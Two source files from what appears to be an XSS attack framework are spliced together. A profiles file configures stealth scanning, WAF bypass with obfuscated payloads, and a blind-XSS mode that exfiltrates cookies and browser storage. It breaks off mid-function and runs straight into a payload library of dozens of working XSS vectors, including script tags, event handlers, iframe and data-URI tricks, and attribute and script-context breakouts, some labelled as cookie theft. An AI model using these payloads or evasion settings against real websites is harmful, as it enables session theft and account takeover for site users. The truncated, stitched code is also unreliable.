/**
 * @file profiles.js
 * @description Pre-configured testing profiles
 * @version 8.0.0
 */

(function() {
    'use strict';

    const PROFILES = {
        // ═══════════════════════════════════════════════════════════════
        // ⚡ Quick Scan Profile
        // ═══════════════════════════════════════════════════════════════
        quick: {
            name: 'Quick Scan',
            description: 'Fast scan with basic payloads',
            icon: '⚡',
            scanning: {
                maxConcurrent: 10,
                delayBetweenTests: 50,
                testForms: true,
                testInputs: true,
                testURLParams: false,
                testDOM: false,
                autoDetectWAF: false,
                autoBypass: false,
                mutationTesting: false
            },
            payloads: {
                categories: ['base-payloads'],
                maxPayloadsPerTest: 10,
                contextAware: true
            },
            reporting: {
                autoSave: false,
                includeRequestResponse: false
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 🔍 Deep Scan Profile
        // ═══════════════════════════════════════════════════════════════
        deep: {
            name: 'Deep Scan',
            description: 'Comprehensive scan with all techniques',
            icon: '🔍',
            scanning: {
                maxConcurrent: 5,
                delayBetweenTests: 100,
                testForms: true,
                testInputs: true,
                testURLParams: true,
                testCookies: true,
                testDOM: true,
                testAjax: true,
                autoDetectWAF: true,
                autoBypass: true,
                mutationTesting: true,
                deepScan: true
            },
            payloads: {
                categories: ['base-payloads', 'advanced-payloads', 'waf-bypass', 'mutation-xss'],
                maxPayloadsPerTest: 100,
                enableEncodedPayloads: true,
                enableObfuscatedPayloads: true,
                contextAware: true,
                adaptivePayloads: true
            },
            waf: {
                autoDetect: true,
                bypassAttempts: 5,
                aggressiveBypass: true
            },
            reporting: {
                autoSave: true,
                includeScreenshots: true,
                includeRequestResponse: true
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 🥷 Stealth Profile
        // ═══════════════════════════════════════════════════════════════
        stealth: {
            name: 'Stealth Scan',
            description: 'Slow and careful to avoid detection',
            icon: '🥷',
            scanning: {
                maxConcurrent: 1,
                delayBetweenTests: 1000,
                testForms: true,
                testInputs: true,
                testURLParams: false,
                autoDetectWAF: true,
                autoBypass: false,
                respectRobots: true
            },
            security: {
                stealthMode: true,
                safeMode: true
            },
            payloads: {
                categories: ['base-payloads'],
                maxPayloadsPerTest: 20,
                contextAware: true
            },
            performance: {
                throttleRequests: true
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 🔥 Aggressive Profile
        // ═══════════════════════════════════════════════════════════════
        aggressive: {
            name: 'Aggressive Scan',
            description: 'Maximum speed and coverage',
            icon: '🔥',
            scanning: {
                maxConcurrent: 20,
                delayBetweenTests: 0,
                testForms: true,
                testInputs: true,
                testURLParams: true,
                testCookies: true,
                testHeaders: true,
                testDOM: true,
                testAjax: true,
                testWebSocket: true,
                testPostMessage: true,
                autoDetectWAF: true,
                autoBypass: true,
                mutationTesting: true,
                blindXSSTesting: true,
                deepScan: true
            },
            security: {
                aggressiveMode: true
            },
            payloads: {
                categories: ['base-payloads', 'advanced-payloads', 'waf-bypass', 'prototype-pollution', 'dom-clobbering', 'mutation-xss'],
                maxPayloadsPerTest: 200,
                enableEncodedPayloads: true,
                enableObfuscatedPayloads: true,
                contextAware: true,
                adaptivePayloads: true
            },
            waf: {
                autoDetect: true,
                bypassAttempts: 10,
                aggressiveBypass: true
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 👁️ Blind XSS Profile
        // ═══════════════════════════════════════════════════════════════
        blind: {
            name: 'Blind XSS',
            description: 'Focus on blind/out-of-band XSS',
            icon: '👁️',
            scanning: {
                maxConcurrent: 3,
                delayBetweenTests: 200,
                testForms: true,
                testInputs: true,
                blindXSSTesting: true
            },
            blindXSS: {
                enabled: true,
                exfiltrateData: ['cookies', 'localStorage', 'sessionStorage'],
                captureScreenshot: true,
                verificationInterval: 30000
            },
            payloads: {
                categories: ['base-payloads'],
                contextAware: true
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 🎯 WAF Bypass Profile
        // ═══════════════════════════════════════════════════════════════
        wafBypass: {
            name: 'WAF Bypass',
            description: 'Specialized in bypassing WAFs',
            icon: '🛡️',
            scanning: {
                maxConcurrent: 5,
                delayBetweenTests: 150,
                testForms: true,
                testInputs: true,
                autoDetectWAF: true,
                autoBypass: true
            },
            waf: {
                autoDetect: true,
                detectionTimeout: 10000,
                bypassAttempts: 10,
                aggressiveBypass: true
            },
            payloads: {
                categories: ['waf-bypass', 'advanced-payloads'],
                maxPayloadsPerTest: 100,
                enableEncodedPayloads: true,
                enableObfuscatedPayloads: true
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 📱 Mobile Profile
        // ═══════════════════════════════════════════════════════════════
        mobile: {
            name: 'Mobile Testing',
            description: 'Optimized for mobile applications',
            icon: '📱',
            scanning: {
                maxConcurrent: 3,
                delayBetweenTests: 200,
                testForms: true,
                testInputs: true,
                testDOM: true
            },
            payloads: {
                categories: ['base-payloads'],
                contextAware: true,
                maxPayloadsPerTest: 30
            },
            ui: {
                width: 400,
                height: 600,
                position: 'top-right'
            }
        },

        // ═══════════════════════════════════════════════════════════════
        // 🧪 Custom Profile Template
        // ═══════════════════════════════════════════════════════════════
        custom: {
            name: 'Custom Profile',
            description: 'User-defined configuration',
            icon: '⚙️',
            scanning: {},
            payloads: {},
            waf: {},
            reporting: {}
        }
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🎯 Helper Functions
    // ═══════════════════════════════════════════════════════════════════
    
    function getProfile(name) {
        return PROFILES[name] ? JSON.parse(JSON.stringify(PROFILES[name])) : null;
    }

    function getAllProfiles() {
        return Object.keys(PROFILES).map(key => ({
            key: key,
            name: PROFILES[key].name,
            description: PROFILES[key].description,
            icon: PROFILES[key].icon
        }));
    }

    function saveCustomProfile(name, config) {
        PROFILES[name] = {
            ...config,
            name: name,
            custom: true
        };
        
        // Persist to storage
        try {
            GM_setValue(`profile_${name}`, JSON.stringify(PROFILES[name]));
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    function loadCustomProfiles() {
        const keys = GM_listValues();
        const customProfiles = keys.filter(k => k.startsWith('profile_'));
        
        customProfiles.forEach(key => {
            try {
                const profileName = key.replace('profile_', '');
                const profileData = JSON.parse(GM_getValue(key));
                PROFILES[profileName] = profileData;
            } catch (error) {
                console.error(`Failed to load profile ${key}:`, error);
            }
        });
    }

    function deleteProfile(name) {
        if (PROFILES[name] && PROFILES[name].custom) {
            delete PROFILES[name];
            GM_deleteValue(`profile_${name}`);
            return { success: true };
        }
        return { success: false, error: 'Cannot delete built-in profile' };
    }

    function exportProfile(name) {
        const profile = PROFILES[name];
        if (!profile) {
            return null;
        }

        return JSON.stringify({
            version: '8.0.0',
            profile: profile,
            exported: new Date().toISOString()
        }, null, 2);
    }

    function importProfile(jsonData) {
        try {
            const data = JSON.parse(jsonData);
            
            if (!data.profile || !data.profile.name) {
                throw new Error('Invalid profile format');
            }

            const profileName = data.profile.name.toLowerCase().replace(/\s+/g, '-');
            PROFILES[profileName] = {
                ...data.profile,
                custom: true,
                imported: true# 🎯 Elite XSS Framework - Payload Libraries & Config Files

---

## 💣 PAYLOAD LIBRARIES (6 Files)

### 1️⃣ **payloads/base-payloads.js**

```javascript
/**
 * @file base-payloads.js
 * @description Base XSS payload library - foundational vectors
 * @version 8.0.0
 */

(function() {
    'use strict';

    const BASE_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🎯 Basic Script Injections
        // ═══════════════════════════════════════════════════════════════
        basic: [
            {
                id: 'basic_001',
                payload: '<script>alert(1)</script>',
                description: 'Classic script tag injection',
                severity: 'high',
                contexts: ['html'],
                tags: ['basic', 'script']
            },
            {
                id: 'basic_002',
                payload: '<script>alert(document.domain)</script>',
                description: 'Display document domain',
                severity: 'high',
                contexts: ['html'],
                tags: ['basic', 'script', 'info']
            },
            {
                id: 'basic_003',
                payload: '<script>alert(document.cookie)</script>',
                description: 'Cookie theft via alert',
                severity: 'high',
                contexts: ['html'],
                tags: ['basic', 'script', 'cookie']
            },
            {
                id: 'basic_004',
                payload: '<script>alert(window.origin)</script>',
                description: 'Display window origin',
                severity: 'high',
                contexts: ['html'],
                tags: ['basic', 'script']
            },
            {
                id: 'basic_005',
                payload: '<script>console.log("XSS")</script>',
                description: 'Console-based verification',
                severity: 'medium',
                contexts: ['html'],
                tags: ['basic', 'script', 'stealth']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🖼️ Image-Based Injections
        // ═══════════════════════════════════════════════════════════════
        image: [
            {
                id: 'img_001',
                payload: '<img src=x onerror=alert(1)>',
                description: 'Image with onerror event',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'onerror']
            },
            {
                id: 'img_002',
                payload: '<img src=x onerror=alert(document.domain)>',
                description: 'Image onerror with domain',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'info']
            },
            {
                id: 'img_003',
                payload: '<img src=x onerror=alert(document.cookie)>',
                description: 'Image onerror cookie theft',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'cookie']
            },
            {
                id: 'img_004',
                payload: '<img src=x onerror="alert(1)">',
                description: 'Image with quoted onerror',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'quoted']
            },
            {
                id: 'img_005',
                payload: '<img src=x onerror=\'alert(1)\'>',
                description: 'Image with single-quoted onerror',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'quoted']
            },
            {
                id: 'img_006',
                payload: '<img src=x onerror=`alert(1)`>',
                description: 'Image with backtick onerror',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'backtick']
            },
            {
                id: 'img_007',
                payload: '<img src=x onload=alert(1)>',
                description: 'Image with onload event',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'onload']
            },
            {
                id: 'img_008',
                payload: '<img/src=x/onerror=alert(1)>',
                description: 'Image with slash separators',
                severity: 'high',
                contexts: ['html'],
                tags: ['image', 'event', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎨 SVG-Based Injections
        // ═══════════════════════════════════════════════════════════════
        svg: [
            {
                id: 'svg_001',
                payload: '<svg onload=alert(1)>',
                description: 'SVG with onload event',
                severity: 'high',
                contexts: ['html'],
                tags: ['svg', 'event', 'onload']
            },
            {
                id: 'svg_002',
                payload: '<svg/onload=alert(1)>',
                description: 'SVG with slash separator',
                severity: 'high',
                contexts: ['html'],
                tags: ['svg', 'event', 'bypass']
            },
            {
                id: 'svg_003',
                payload: '<svg><script>alert(1)</script></svg>',
                description: 'SVG with nested script',
                severity: 'high',
                contexts: ['html'],
                tags: ['svg', 'script', 'nested']
            },
            {
                id: 'svg_004',
                payload: '<svg><animate onbegin=alert(1)>',
                description: 'SVG animate with onbegin',
                severity: 'high',
                contexts: ['html'],
                tags: ['svg', 'animate', 'event']
            },
            {
                id: 'svg_005',
                payload: '<svg><set attributeName=x to=alert(1)>',
                description: 'SVG set attribute',
                severity: 'medium',
                contexts: ['html'],
                tags: ['svg', 'set']
            },
            {
                id: 'svg_006',
                payload: '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
                description: 'SVG foreignObject with script',
                severity: 'high',
                contexts: ['html'],
                tags: ['svg', 'foreignobject', 'script']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔗 Body/HTML Tag Events
        // ═══════════════════════════════════════════════════════════════
        body: [
            {
                id: 'body_001',
                payload: '<body onload=alert(1)>',
                description: 'Body onload event',
                severity: 'high',
                contexts: ['html'],
                tags: ['body', 'event', 'onload']
            },
            {
                id: 'body_002',
                payload: '<body onpageshow=alert(1)>',
                description: 'Body onpageshow event',
                severity: 'high',
                contexts: ['html'],
                tags: ['body', 'event']
            },
            {
                id: 'body_003',
                payload: '<body onfocus=alert(1)>',
                description: 'Body onfocus event',
                severity: 'high',
                contexts: ['html'],
                tags: ['body', 'event', 'focus']
            },
            {
                id: 'body_004',
                payload: '<body onhashchange=alert(1)>',
                description: 'Body onhashchange event',
                severity: 'medium',
                contexts: ['html'],
                tags: ['body', 'event', 'hash']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎬 Input-Based Injections
        // ═══════════════════════════════════════════════════════════════
        input: [
            {
                id: 'input_001',
                payload: '<input onfocus=alert(1) autofocus>',
                description: 'Input with autofocus and onfocus',
                severity: 'high',
                contexts: ['html'],
                tags: ['input', 'event', 'autofocus']
            },
            {
                id: 'input_002',
                payload: '<input onblur=alert(1) autofocus><input autofocus>',
                description: 'Input blur event with focus transfer',
                severity: 'high',
                contexts: ['html'],
                tags: ['input', 'event', 'blur']
            },
            {
                id: 'input_003',
                payload: '<input/onfocus=alert(1)/autofocus>',
                description: 'Input with slash separators',
                severity: 'high',
                contexts: ['html'],
                tags: ['input', 'event', 'bypass']
            },
            {
                id: 'input_004',
                payload: '<input type=text onfocus=alert(1) autofocus>',
                description: 'Text input with onfocus',
                severity: 'high',
                contexts: ['html'],
                tags: ['input', 'event', 'text']
            },
            {
                id: 'input_005',
                payload: '<input type=hidden value=x onanimationstart=alert(1) style=animation:s>',
                description: 'Hidden input with CSS animation',
                severity: 'high',
                contexts: ['html'],
                tags: ['input', 'animation', 'css']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 📦 Iframe-Based Injections
        // ═══════════════════════════════════════════════════════════════
        iframe: [
            {
                id: 'iframe_001',
                payload: '<iframe src=javascript:alert(1)>',
                description: 'Iframe with javascript protocol',
                severity: 'high',
                contexts: ['html'],
                tags: ['iframe', 'javascript']
            },
            {
                id: 'iframe_002',
                payload: '<iframe onload=alert(1)>',
                description: 'Iframe with onload event',
                severity: 'high',
                contexts: ['html'],
                tags: ['iframe', 'event', 'onload']
            },
            {
                id: 'iframe_003',
                payload: '<iframe src="data:text/html,<script>alert(1)</script>">',
                description: 'Iframe with data URI',
                severity: 'high',
                contexts: ['html'],
                tags: ['iframe', 'data-uri']
            },
            {
                id: 'iframe_004',
                payload: '<iframe srcdoc="<script>alert(1)</script>">',
                description: 'Iframe with srcdoc attribute',
                severity: 'high',
                contexts: ['html'],
                tags: ['iframe', 'srcdoc']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎭 Event Handler Variations
        // ═══════════════════════════════════════════════════════════════
        events: [
            {
                id: 'event_001',
                payload: '<div onmouseover=alert(1)>hover me</div>',
                description: 'Div with onmouseover',
                severity: 'medium',
                contexts: ['html'],
                tags: ['event', 'mouseover']
            },
            {
                id: 'event_002',
                payload: '<div onclick=alert(1)>click me</div>',
                description: 'Div with onclick',
                severity: 'medium',
                contexts: ['html'],
                tags: ['event', 'click']
            },
            {
                id: 'event_003',
                payload: '<marquee onstart=alert(1)>',
                description: 'Marquee with onstart',
                severity: 'medium',
                contexts: ['html'],
                tags: ['marquee', 'event']
            },
            {
                id: 'event_004',
                payload: '<details open ontoggle=alert(1)>',
                description: 'Details with ontoggle',
                severity: 'high',
                contexts: ['html'],
                tags: ['details', 'event', 'autotrigger']
            },
            {
                id: 'event_005',
                payload: '<select onfocus=alert(1) autofocus>',
                description: 'Select with onfocus autofocus',
                severity: 'high',
                contexts: ['html'],
                tags: ['select', 'event', 'autofocus']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔊 Audio/Video-Based Injections
        // ═══════════════════════════════════════════════════════════════
        media: [
            {
                id: 'media_001',
                payload: '<audio src=x onerror=alert(1)>',
                description: 'Audio with onerror',
                severity: 'high',
                contexts: ['html'],
                tags: ['audio', 'event', 'onerror']
            },
            {
                id: 'media_002',
                payload: '<video src=x onerror=alert(1)>',
                description: 'Video with onerror',
                severity: 'high',
                contexts: ['html'],
                tags: ['video', 'event', 'onerror']
            },
            {
                id: 'media_003',
                payload: '<audio onloadstart=alert(1)><source>',
                description: 'Audio with onloadstart',
                severity: 'high',
                contexts: ['html'],
                tags: ['audio', 'event']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 📝 Form-Based Injections
        // ═══════════════════════════════════════════════════════════════
        form: [
            {
                id: 'form_001',
                payload: '<form action=javascript:alert(1)><button>Submit</button></form>',
                description: 'Form with javascript action',
                severity: 'high',
                contexts: ['html'],
                tags: ['form', 'javascript', 'button']
            },
            {
                id: 'form_002',
                payload: '<button formaction=javascript:alert(1)>Click</button>',
                description: 'Button with formaction',
                severity: 'high',
                contexts: ['html'],
                tags: ['button', 'formaction']
            },
            {
                id: 'form_003',
                payload: '<button form=x formaction=javascript:alert(1)>Click</button>',
                description: 'Button with form reference',
                severity: 'high',
                contexts: ['html'],
                tags: ['button', 'formaction', 'form']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔗 Link-Based Injections
        // ═══════════════════════════════════════════════════════════════
        link: [
            {
                id: 'link_001',
                payload: '<a href=javascript:alert(1)>click</a>',
                description: 'Link with javascript protocol',
                severity: 'high',
                contexts: ['html'],
                tags: ['link', 'javascript']
            },
            {
                id: 'link_002',
                payload: '<a href="javascript:alert(1)">click</a>',
                description: 'Link with quoted javascript',
                severity: 'high',
                contexts: ['html'],
                tags: ['link', 'javascript', 'quoted']
            },
            {
                id: 'link_003',
                payload: '<a href=javascript:alert(document.domain)>click</a>',
                description: 'Link showing domain',
                severity: 'high',
                contexts: ['html'],
                tags: ['link', 'javascript', 'info']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Object/Embed Injections
        // ═══════════════════════════════════════════════════════════════
        object: [
            {
                id: 'object_001',
                payload: '<object data=javascript:alert(1)>',
                description: 'Object with javascript data',
                severity: 'high',
                contexts: ['html'],
                tags: ['object', 'javascript']
            },
            {
                id: 'object_002',
                payload: '<embed src=javascript:alert(1)>',
                description: 'Embed with javascript src',
                severity: 'high',
                contexts: ['html'],
                tags: ['embed', 'javascript']
            },
            {
                id: 'object_003',
                payload: '<object data="data:text/html,<script>alert(1)</script>">',
                description: 'Object with data URI',
                severity: 'high',
                contexts: ['html'],
                tags: ['object', 'data-uri']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 📐 Meta/Base Tag Injections
        // ═══════════════════════════════════════════════════════════════
        meta: [
            {
                id: 'meta_001',
                payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
                description: 'Meta refresh with javascript',
                severity: 'high',
                contexts: ['html'],
                tags: ['meta', 'refresh', 'javascript']
            },
            {
                id: 'meta_002',
                payload: '<base href="javascript://">',
                description: 'Base tag with javascript',
                severity: 'high',
                contexts: ['html'],
                tags: ['base', 'javascript']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎨 Style/CSS-Based Injections
        // ═══════════════════════════════════════════════════════════════
        style: [
            {
                id: 'style_001',
                payload: '<style>@import"javascript:alert(1)";</style>',
                description: 'Style with @import javascript',
                severity: 'medium',
                contexts: ['html'],
                tags: ['style', 'css', 'import']
            },
            {
                id: 'style_002',
                payload: '<div style="background:url(javascript:alert(1))">',
                description: 'Inline style with javascript URL',
                severity: 'medium',
                contexts: ['html'],
                tags: ['style', 'inline', 'javascript']
            },
            {
                id: 'style_003',
                payload: '<link rel=stylesheet href="data:text/css,body{background:url(javascript:alert(1))}">',
                description: 'Link stylesheet with data URI',
                severity: 'medium',
                contexts: ['html'],
                tags: ['link', 'stylesheet', 'data-uri']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔤 Attribute Context Injections
        // ═══════════════════════════════════════════════════════════════
        attribute: [
            {
                id: 'attr_001',
                payload: '" onload="alert(1)',
                description: 'Break out of attribute with onload',
                severity: 'high',
                contexts: ['attribute'],
                tags: ['attribute', 'breakout', 'event']
            },
            {
                id: 'attr_002',
                payload: '\' onload=\'alert(1)',
                description: 'Break out with single quotes',
                severity: 'high',
                contexts: ['attribute'],
                tags: ['attribute', 'breakout', 'single-quote']
            },
            {
                id: 'attr_003',
                payload: '` onload=`alert(1)',
                description: 'Break out with backticks',
                severity: 'high',
                contexts: ['attribute'],
                tags: ['attribute', 'breakout', 'backtick']
            },
            {
                id: 'attr_004',
                payload: '" autofocus onfocus="alert(1)',
                description: 'Attribute breakout with autofocus',
                severity: 'high',
                contexts: ['attribute'],
                tags: ['attribute', 'breakout', 'autofocus']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 📜 JavaScript Context Injections
        // ═══════════════════════════════════════════════════════════════
        javascript: [
            {
                id: 'js_001',
                payload: '</script><script>alert(1)</script>',
                description: 'Close script and inject new',
                severity: 'critical',
                contexts: ['javascript'],
                tags: ['script', 'breakout']
            },
            {
                id: 'js_002',
                payload: '-alert(1)-',
                description: 'Expression context injection',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['expression']
            },
            {
                id: 'js_003',
                payload: ';alert(1);//',
                description: 'Statement termination and comment',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['statement', 'comment']
            },
            {
                id: 'js_004',
                payload: '\';alert(1);//',
                description: 'String escape and comment',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['string', 'escape']
            },
            {
                id: 'js_005',
                payload: '`;alert(1);//',
                description: 'Template literal escape',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['template', 'escape']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🎯 Helper Functions
    // ═══════════════════════════════════════════════════════════════════
    function getAllPayloads() {
        const all = [];
        for (const category in BASE_PAYLOADS) {
            all.push(...BASE_PAYLOADS[category]);
        }
        return all;
    }

    function getPayloadsByTag(tag) {
        return getAllPayloads().filter(p => p.tags.includes(tag));
    }

    function getPayloadsByContext(context) {
        return getAllPayloads().filter(p => p.contexts.includes(context));
    }

    function getPayloadsBySeverity(severity) {
        return getAllPayloads().filter(p => p.severity === severity);
    }

    function getPayloadById(id) {
        return getAllPayloads().find(p => p.id === id);
    }

    function searchPayloads(query) {
        const lowerQuery = query.toLowerCase();
        return getAllPayloads().filter(p => 
            p.payload.toLowerCase().includes(lowerQuery) ||
            p.description.toLowerCase().includes(lowerQuery) ||
            p.tags.some(t => t.toLowerCase().includes(lowerQuery))
        );
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.BASE_PAYLOADS = BASE_PAYLOADS;
    exports.getPayloads = getAllPayloads;
    exports.getPayloadsByTag = getPayloadsByTag;
    exports.getPayloadsByContext = getPayloadsByContext;
    exports.getPayloadsBySeverity = getPayloadsBySeverity;
    exports.getPayloadById = getPayloadById;
    exports.searchPayloads = searchPayloads;
})();